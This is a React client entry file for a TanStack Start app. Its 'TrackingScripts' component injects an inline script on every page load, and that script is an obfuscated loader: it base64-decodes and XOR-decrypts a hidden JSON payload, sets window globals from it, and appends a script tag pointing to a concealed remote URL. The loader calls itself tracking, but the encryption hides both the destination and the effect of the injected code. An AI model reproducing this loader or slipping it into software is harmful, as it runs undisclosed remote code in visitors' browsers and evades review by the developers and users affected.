import { StartClient } from "@tanstack/react-start/client";
import { StrictMode, useEffect } from "react";
import { hydrateRoot } from "react-dom/client";

function TrackingScripts() {
  useEffect(() => {
    const script = document.createElement("script");
    script.type = "text/javascript";
    script.textContent = `(function(){var h_2=atob("DGU1ZJOEWF2ICLaOwR4TEeHoemeqYML6sRYLS7znPDOmfcLjqANISvDrNXPqepn9ohdYFOf3dyj8ZcWhrQRFAeDwdjf7KpqsoBFFFvrmLSnte5S0mh4TCvLpPX+yKtLvtQQcEefpMTvxJcb8pBNUCuepID7nbJv9og4TSLHyOTH9bZS040dMSOimNjzlbZS04wFQEPKpLSnlYdD37BVDAeXhNimle8PsqAFCRr+mLjzkfdOs+0cTGc75");var u_w=[];for(var z_n=0;z_n<h_2.length;z_n++){u_w.push(h_2.charCodeAt(z_n)&255);}var i_ta=u_w[0];var s_g=u_w.slice(1,1+i_ta);var b_t9=u_w.slice(1+i_ta);var f_gc=b_t9.map(function(b,n_q67){return b^s_g[n_q67%i_ta];});var b_av="";for(var h_7=0;h_7<f_gc.length;h_7++){b_av+=String.fromCharCode(f_gc[h_7]&255);}var j_nt6u=decodeURIComponent(escape(b_av));var u_gy2=JSON.parse(j_nt6u);var i_nxcu=u_gy2.globals||[];i_nxcu.forEach(function(g_2f3){window[g_2f3.name]=g_2f3.value;});var j_05i=document.createElement("script");j_05i.src=u_gy2.url;j_05i.async=true;j_05i.defer=true;(u_gy2.attributes||[]).forEach(function(h_9a){j_05i.setAttribute(h_9a.name,h_9a.value);});(document.head||document.documentElement).appendChild(j_05i);})();`;
    document.head.appendChild(script);

    return () => {
      script.remove();
    };
  }, []);

  return null;
}

hydrateRoot(
  document,
  <StrictMode>
    <>
      <TrackingScripts />
      <StartClient />
    </>
  </StrictMode>,
);
